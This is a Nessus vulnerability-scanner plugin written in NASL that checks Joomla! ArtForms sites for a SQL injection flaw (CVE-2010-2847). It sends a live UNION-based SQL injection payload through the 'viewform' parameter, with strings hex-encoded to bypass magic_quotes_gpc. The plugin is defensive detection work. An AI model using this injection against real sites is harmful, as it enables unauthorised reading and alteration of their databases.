#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(47700);
  script_version("1.18");
  script_set_attribute(attribute:"plugin_modification_date", value:"2024/06/05");

  script_cve_id("CVE-2010-2847");
  script_bugtraq_id(41457);
  script_xref(name:"EDB-ID", value:"14263");

  script_name(english:"ArtForms Component for Joomla! 'viewform' Parameter SQLi");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
SQL injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of the ArtForms component for Joomla! running on the
remote host is affected by a SQL injection vulnerability due to
improper sanitization of user-supplied input to the 'viewform'
parameter when 'task=ferforms' before using it to construct database
queries. Regardless of the PHP 'magic_quotes_gpc' setting, an
unauthenticated, remote attacker can exploit this issue to manipulate
database queries, resulting in disclosure of sensitive information,
modification of data, or other attacks against the underlying
database.

Note that this component is likely to be affected by other issues,
such as directory traversal, cross-site scripting, and other SQL
injection vulnerabilities; however, Nessus has not checked for these.");
  script_set_attribute(attribute:"see_also", value:"https://www.securityfocus.com/archive/1/512215/30/0/threaded");
  script_set_attribute(attribute:"solution", value:
"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:U/RC:X");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/07/07");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/07/12");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:joomla:joomla\!");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_set_attribute(attribute:"enable_cgi_scanning", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2024 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl");
  script_require_keys("installed_sw/Joomla!", "www/PHP");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "Joomla!";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);
dir = install['path'];
install_url =  build_url(port:port, qs:dir);

# Verify component is installed
plugin = "ArtForms";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  regexes = make_list();
  regexes[0] = make_list('#artforms-');
  checks["/components/com_artforms/assets/css/artforms.css"]=regexes;

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );

}
if (!installed) audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " component");

# This function converts a string to a concatenation of hex chars so we
# can pass in strings without worrying about PHP's magic_quotes_gpc.
function hexify(str)
{
  local_var hstr, i, l;

  l = strlen(str);
  if (l == 0) return "";

  hstr = "concat(";
  for (i=0; i<l; i++)
    hstr += hex(ord(str[i])) + ",";
  hstr[strlen(hstr)-1] = ")";

  return hstr;
}

# Try to exploit the issue to manipulate form information for a non-existent form id.
magic1 = "NESSUS-" + unixtime();
magic2 = SCRIPT_NAME;
exploit = (1000 + (rand() % 1000)) + " UNION ALL SELECT " + hexify(str:magic1) + "," + hexify(str:magic2) + ",3,4,5," + hexify(str:"NESSUS") + " -- ";

url = '/index.php?option=com_artforms&task=ferforms&viewform=' + str_replace(find:" ", replace:"%20", string:exploit);

res = http_send_recv3(port:port, method:"GET", item:dir+url, exit_on_fail:TRUE);

if (
  'id='+magic1+'&' >< res[2] &&
  'class="highslide">'+magic2+'</a>' >< res[2]
)
{
  output = strstr(res[2], magic1);
  if (empty_or_null(output)) output = res[2];

  security_report_v4(
    port        : port,
    severity    : SECURITY_HOLE,
    sqli        : TRUE,
    line_limit  : 3,
    generic     : TRUE,
    request     : make_list(install_url + url),
    output      : chomp(output)
  );
  exit(0);
}
else
  audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " component");
